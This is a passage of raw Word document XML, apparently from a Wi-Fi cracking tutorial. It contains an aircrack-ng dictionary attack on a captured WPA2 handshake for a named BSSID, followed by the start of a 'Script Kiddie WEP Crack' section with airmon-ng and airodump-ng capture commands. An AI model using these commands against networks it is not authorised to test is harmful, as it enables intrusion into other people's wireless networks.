      <w:r w:rsidRPr="008274A1">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
          <w:szCs w:val="16"/>
        </w:rPr>
        <w:t>rw</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="008274A1">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
          <w:szCs w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">-r--r-- 1 root </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="008274A1">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
          <w:szCs w:val="16"/>
        </w:rPr>
        <w:t>root</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="008274A1">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
          <w:szCs w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve"> 35189 2009-02-21 13:04 /</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="008274A1">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
          <w:szCs w:val="16"/>
        </w:rPr>
        <w:t>tmp</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="008274A1">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
          <w:szCs w:val="16"/>
        </w:rPr>
        <w:t>/wpa2-01.cap</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2D3A2550"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w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="008274A1">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
          <w:szCs w:val="16"/>
        </w:rPr>
        <w:t>rw</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="008274A1">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
          <w:szCs w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">-r--r-- 1 root </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="008274A1">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
          <w:szCs w:val="16"/>
        </w:rPr>
        <w:t>root</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="008274A1">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
          <w:szCs w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">   476 2009-02-21 13:04 /</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="008274A1">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
          <w:szCs w:val="16"/>
        </w:rPr>
        <w:t>tmp</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="008274A1">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
          <w:szCs w:val="16"/>
        </w:rPr>
        <w:t>/wpa2-01.csv</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2AB640B6"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16"/>
          <w:szCs w:val="16"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="008274A1">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
          <w:szCs w:val="16"/>
        </w:rPr>
        <w:t>-</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="008274A1">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
          <w:szCs w:val="16"/>
        </w:rPr>
        <w:t>rw</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="008274A1">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
          <w:szCs w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">-r--r-- 1 root </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="008274A1">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
          <w:szCs w:val="16"/>
        </w:rPr>
        <w:t>root</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="008274A1">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
          <w:szCs w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">   590 2009-02-21 13:04 /</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="008274A1">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
          <w:szCs w:val="16"/>
        </w:rPr>
        <w:t>tmp</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="008274A1">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
          <w:szCs w:val="16"/>
        </w:rPr>
        <w:t>/wpa2-01.kismet.csv</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2CDD4702" w14:textId="77777777" w:rsidR="002B0795"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rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3FF9D6BE" w14:textId="77777777" w:rsidR="002B0795" w:rsidRPr="003112DC"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b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="003112DC">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>aircrack</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="003112DC">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>-ng</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="003112DC">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> –w /</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="003112DC">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>usr</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="003112DC">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>/share/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="003112DC">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>dict</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="003112DC">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="003112DC">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>craclib</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="003112DC">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>-small -b 00:19:5B:52:AD:F7 /</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="003112DC">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>tmp</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="003112DC">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>/wpa2*.cap</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6EB007A5" w14:textId="77777777" w:rsidR="002B0795" w:rsidRPr="008274A1" w:rsidRDefault="002B0795" w:rsidP="002B07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000000"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="72222FDD" w14:textId="77777777" w:rsidR="002B0795" w:rsidRDefault="002B0795" w:rsidP="002B0795">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:b/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="249312EB" w14:textId="77777777" w:rsidR="002B0795" w:rsidRDefault="002B0795" w:rsidP="002B0795">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:b/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="39498EEC" w14:textId="77777777" w:rsidR="002B0795" w:rsidRDefault="002B0795" w:rsidP="002B0795">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:b/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="55FCCD7F" w14:textId="77777777" w:rsidR="002B0795" w:rsidRDefault="002B0795" w:rsidP="002B0795">
      <w:pPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5E647234" w14:textId="77777777" w:rsidR="002B0795" w:rsidRDefault="002B0795" w:rsidP="002B0795">
      <w:pPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4E7E1267" w14:textId="77777777" w:rsidR="002B0795" w:rsidRDefault="002B0795" w:rsidP="002B0795">
      <w:pPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5594C744" w14:textId="77777777" w:rsidR="002B0795" w:rsidRDefault="002B0795" w:rsidP="002B0795">
      <w:pPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="47AD7157" w14:textId="77777777" w:rsidR="002B0795" w:rsidRDefault="002B0795" w:rsidP="002B0795">
      <w:pPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="63E1F730" w14:textId="77777777" w:rsidR="002B0795" w:rsidRDefault="002B0795" w:rsidP="002B0795">
      <w:pPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6ED4CB72" w14:textId="77777777" w:rsidR="002B0795" w:rsidRDefault="002B0795" w:rsidP="002B0795">
      <w:pPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="748DBA8A" w14:textId="77777777" w:rsidR="002B0795" w:rsidRDefault="002B0795" w:rsidP="002B0795">
      <w:pPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7C3A3026" w14:textId="77777777" w:rsidR="002B0795" w:rsidRDefault="002B0795" w:rsidP="002B0795">
      <w:pPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5F5610EC" w14:textId="77777777" w:rsidR="002B0795" w:rsidRDefault="002B0795" w:rsidP="002B0795">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="03D415F7" w14:textId="77777777" w:rsidR="002B0795" w:rsidRDefault="002B0795" w:rsidP="002B0795">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7A5B4B3E" w14:textId="77777777" w:rsidR="002B0795" w:rsidRDefault="002B0795" w:rsidP="002B0795">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1B62714D" w14:textId="77777777" w:rsidR="002B0795" w:rsidRDefault="002B0795" w:rsidP="002B0795">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2AA1607B" w14:textId="77777777" w:rsidR="002B0795" w:rsidRDefault="002B0795" w:rsidP="002B0795">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0BFF096E" w14:textId="77777777" w:rsidR="002B0795" w:rsidRDefault="002B0795" w:rsidP="002B0795">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="52198405" w14:textId="77777777" w:rsidR="002B0795" w:rsidRDefault="002B0795" w:rsidP="002B0795">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="37EAA376" w14:textId="77777777" w:rsidR="002B0795" w:rsidRDefault="002B0795" w:rsidP="002B0795">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="56"/>
          <w:szCs w:val="56"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3F8DB212" w14:textId="77777777" w:rsidR="002B0795" w:rsidRDefault="002B0795" w:rsidP="002B0795">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="56"/>
          <w:szCs w:val="56"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="39F52BF7" w14:textId="77777777" w:rsidR="002B0795" w:rsidRDefault="002B0795" w:rsidP="002B0795">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="56"/>
          <w:szCs w:val="56"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0DA46AE4" w14:textId="77777777" w:rsidR="002B0795" w:rsidRDefault="002B0795" w:rsidP="002B0795">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="56"/>
          <w:szCs w:val="56"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="56"/>
          <w:szCs w:val="56"/>
        </w:rPr>
        <w:t>Script Kiddie WEP Crack (10,000 IVs)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="77A55D3B" w14:textId="77777777" w:rsidR="002B0795" w:rsidRDefault="002B0795" w:rsidP="002B0795">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1DF68750" w14:textId="77777777" w:rsidR="002B0795" w:rsidRPr="00FD0ABD" w:rsidRDefault="002B0795" w:rsidP="002B0795">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00FD0ABD">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>Airmon-ng</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00FD0ABD">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> start wlan1 11</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="15B1CAAD" w14:textId="77777777" w:rsidR="002B0795" w:rsidRDefault="002B0795" w:rsidP="002B0795">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="60B914AE" w14:textId="77777777" w:rsidR="002B0795" w:rsidRPr="009D5939" w:rsidRDefault="002B0795" w:rsidP="002B0795">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="009D5939">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>In Console 1:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="375B3C24" w14:textId="77777777" w:rsidR="002B0795" w:rsidRDefault="002B0795" w:rsidP="002B0795">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>a</w:t>
      </w:r>
      <w:r w:rsidRPr="000A4CF1">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>irodump</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="000A4CF1">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>-ng</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="000A4CF1">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>--channel 1 wlan0mon --write channel1 –-</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>bssid</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>AP_mac_address</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="421EFE41" w14:textId="77777777" w:rsidR="002B0795" w:rsidRDefault="002B0795" w:rsidP="002B0795">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
